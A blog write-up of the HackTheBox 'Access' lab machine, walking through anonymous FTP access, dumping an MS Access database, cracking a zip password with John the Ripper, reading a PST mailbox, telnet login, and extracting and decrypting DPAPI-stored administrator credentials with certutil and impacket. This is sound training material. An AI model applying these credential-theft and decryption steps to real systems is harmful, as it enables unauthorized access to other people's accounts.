---
title: "Access HackTheBox" 
date: 2025-08-30 06:00:00 0000+
tags: [WriteUp, Access, HTB, Enumeration, FTP, DPAPI, pst-utils, Outlook, Hash Cracking,telnet, mdb-tools, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Access_HTB/preview_access.png
---
# Access HTB Writeup

Access is a easy windows box on HackTheBox which focuses on mdb-tools and saved credentials on the box. It starts off with an anonymous login to the FTP share which contains a file upon reading it with some utilities we get a password which gave us access to the telnet service and we have our first flag, for the privilege escalation part the administrator credentials are cached on the box and by saving the DPAPI MasterKey and the credential we get to decrypt the administrator’s password to gain access as him to retrieve our last flag.

![image.png](/assets/images/Access_HTB/image.png)

## Enumeration and Exploitation

As always we are gonna start off with the rustmap to find the open ports and services on the box.

```bash
rustmap.py -ip 10.129.241.72
```

![image.png](/assets/images/Access_HTB/image%201.png)

We saw that only 3 ports are open ftp, telnet and our http web port.

### FTP Enumeration

Port 21 is open on the box lets enumerate it.

![image.png](/assets/images/Access_HTB/image%202.png)

The anonymous login is enabled, so we logged in using the anonymous username and an empty password.

Now we have 2 folders Backups and Enginner.

In the Backups folder we have a single .mdb file

![image.png](/assets/images/Access_HTB/image%203.png)

The Backup.mdb file is a binary file so I make sure that I switch the mode to binary before downloading the file.

Also in the Engineer folder we have a AccessControl.zip file.

![image.png](/assets/images/Access_HTB/image%204.png)

Downloaded the Access Control.zip file too.

### MDB-Tools (MS Access database)

Lets analyse these both the files.

The Backup.mdb file contains some tables.

```bash
mdb-tables backup.mdb
```

![image.png](/assets/images/Access_HTB/image%205.png)

USERINFO caught my eye.

Using mdb-sql to list its contents.

```bash
mdb-sql backup.mdb -o sqldump.txt
```

After prettifying the data I got this table.

![image.png](/assets/images/Access_HTB/image%206.png)

It contains usernames and passwords.

Now lets check some more tables.

Similarly after searching for more tables we have a table named **auth_user**

```bash
mdb-sql backup.mdb -o sqldata.txt
```

![image.png](/assets/images/Access_HTB/image%207.png)

Now that gives me the table dump with all the data after prettifying the data. we have these entries.

![image.png](/assets/images/Access_HTB/image%208.png)

I will add these to my usernames and passwords .txt files.

### Hash Cracking

Now looking at the zip file obtained.

![image.png](/assets/images/Access_HTB/image%209.png)

It is password protected, we have a numerous passwords now, lets now get a hash using JTR and then try to crack it using our password list.

```bash
zip2john "Access Control.zip" > accesscontrolhash.txt
```

Now using JTR to crack this hash.

```bash
john --wordlist=/passwords.txt accesscontrolhash.txt
```

![image.png](/assets/images/Access_HTB/image%2010.png)

We have a valid hit, now lets unzip this archive.

Unzipping it gives us this Personal Storage file also known as .pst files.

![image.png](/assets/images/Access_HTB/image%2011.png)

### PST-Utils (Microsoft Outlook Personal Storage)

We will need the pst-utils to open these files.

```bash
sudo apt install pst-utils
```

This will download a readpst bin file, that helps to convert the .pst files to .mbox files.

```bash
readpst -r -o pstout "Access Control.pst"
```

![image.png](/assets/images/Access_HTB/image%2012.png)

Now have a mbox file.

```html
From "john@megacorp.com" Fri Aug 24 05:14:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-1188747394_-_-"

----boundary-LibPST-iamunique-1188747394_-_-
Content-Type: multipart/alternative;
	boundary="alt---boundary-LibPST-iamunique-1188747394_-_-"

--alt---boundary-LibPST-iamunique-1188747394_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John

--alt---boundary-LibPST-iamunique-1188747394_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
	{font-family:"Cambria Math";
	panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
	{mso-style-priority:99;
	color:#0563C1;
	text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
	{mso-style-priority:99;
	color:#954F72;
	text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
	{mso-style-name:msonormal;
	mso-margin-top-alt:auto;
	margin-right:0in;
	mso-margin-bottom-alt:auto;
	margin-left:0in;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
span.EmailStyle18
	{mso-style-type:personal-compose;
	font-family:"Calibri",sans-serif;
	color:windowtext;}
.MsoChpDefault
	{mso-style-type:export-only;
	font-size:10.0pt;
	font-family:"Calibri",sans-serif;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-1188747394_-_---

----boundary-LibPST-iamunique-1188747394_-_---
```

This is the mbox file we recieved.

With the HTML rendering by renaming this file to mbox.html we have this page.

![image.png](/assets/images/Access_HTB/image%2013.png)

Now we have a new password **4Cc3ssC0ntr0ller** for the **security** account.

### Shell as Security

Lets now connect to the telnet service and see whats there.

```html
telnet 10.129.241.72
```

![image.png](/assets/images/Access_HTB/image%2014.png)

We have a prompt lets now try to login with the newly found credentials **security:4Cc3ssC0ntr0ller**

![image.png](/assets/images/Access_HTB/image%2015.png)

We successfully logged in and we have a shell on the box.

![image.png](/assets/images/Access_HTB/image%2016.png)

Claimed user.txt file as user security.

### Shell as Administrator

We cant upload winpeas.exe there because the terminal is laggy and slow, so I manually enumerated the privesc part.

When we run cmdkey to list credentials.

```powershell
cmdkey /list
```

![image.png](/assets/images/Access_HTB/image%2017.png)

It has the Administrator credentials stored on the box.

Also in the C:\ directory we also have a ZKTeco folder.

![image.png](/assets/images/Access_HTB/image%2018.png)

But it was some software running on the box.

We also have the DPAPI credentials stored on the box, lets get the Masterkey and credential file.

![image.png](/assets/images/Access_HTB/image%2019.png)

The Microsoft directory was hidden in the appdata/roaming folder.

![image.png](/assets/images/Access_HTB/image%2020.png)

Similarly the Protect and the Credentials folder is also hidden.

![image.png](/assets/images/Access_HTB/image%2021.png)

We need to download this **0792c32e-48a5-4fe3-8b43-d93d64590580** MasterKey File.

Lets first convert this Masterkey’s data to base64 and then copy it to our local machine.

```powershell
certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output
```

![image.png](/assets/images/Access_HTB/image%2022.png)

Lets display our output

![image.png](/assets/images/Access_HTB/image%2023.png)

Copying it to our local machine.

Now lets grab the Credential file.

![image.png](/assets/images/Access_HTB/image%2024.png)

Similarly converting this to a base64 string and transferring it to our local machine.

![image.png](/assets/images/Access_HTB/image%2025.png)

After copying both the MasterKey and the Credential file make sure to remove the ——-CERTIFICATE——- tags.

![image.png](/assets/images/Access_HTB/image%2026.png)

Now we use impacket’s DPAPI to decrypt the masterkey.

```bash
impacket-dpapi masterkey -file 'masterkey' -password '4Cc3ssC0ntr0ller' -sid 'S-1-5-21-953262931-566350628-63446256-1001'
```

![image.png](/assets/images/Access_HTB/image%2027.png)

Now we have the decrypted key.

Lets use this decrypted key to decrypt the credential file.

```bash
impacket-dpapi credential -file 'credential' -key '0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2'
```

![image.png](/assets/images/Access_HTB/image%2028.png)

An we have the password for the administrator account.

Lets now login with telnet using the administrator credentials.

![image.png](/assets/images/Access_HTB/image%2029.png)

Grabbing the root.txt file from the administrator’s desktop.

![image.png](/assets/images/Access_HTB/image%2030.png)

Rooted!

![image.png](/assets/images/Access_HTB/image%2031.png)

Thanks for Reading 😊
